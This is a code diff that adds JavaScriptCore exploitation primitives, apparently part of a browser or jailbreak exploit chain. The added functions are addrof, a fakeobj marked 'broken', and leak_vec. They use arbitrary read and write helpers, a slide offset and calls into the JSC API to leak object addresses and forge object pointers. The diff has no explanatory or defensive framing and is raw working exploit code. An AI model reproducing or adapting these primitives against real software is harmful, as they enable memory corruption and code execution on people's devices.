@@ -229,3 +229,42 @@ function _sptr(s) {
 function sptr(s) {
 	return _sptr(s + "\0");
 }
+
+var string_ref;
+var global_object;
+var jsobj_addr;
+
+var large_buf = new Uint32Array(0x100000);
+var large_buf_ptr = 0;
+
+function prep_shit() {
+	string_ref = scall("JSStringCreateWithUTF8CString", "victim");
+	global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
+	jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
+	large_buf_ptr = leak_vec(large_buf);
+}
+
+function addrof(obj) {
+	victim.target = obj;
+	return read_u32(jsobj_addr + 0x18);
+}
+
+// broken
+function fakeobj(addy) {
+	var string_ref = scall("JSStringCreateWithUTF8CString", sptr("victim"));
+	var global_object = scall("JSContextGetGlobalObject", read_u32(slid + reserve_addr + 0x44));
+	var jsobj_addr = scall("JSObjectGetProperty", read_u32(slid + reserve_addr + 0x44), global_object, string_ref, NULL);
+	printf("YOLO\n");
+	printf("1 %x\n", read_u32(jsobj_addr + 0x18));
+	victim.target = 13.37;
+	printf("2 %x\n", read_u32(jsobj_addr + 0x18));
+	write_u32(jsobj_addr + 0x18, addy);
+	printf("3 %x\n", read_u32(jsobj_addr + 0x18));
+	return victim.target;
+}
+
+function leak_vec(arr) {
+	var addy = addrof(arr);
+	printf("%x\n", addy);
+	return read_u32(addy + VECTOR_OFFSET);
+}
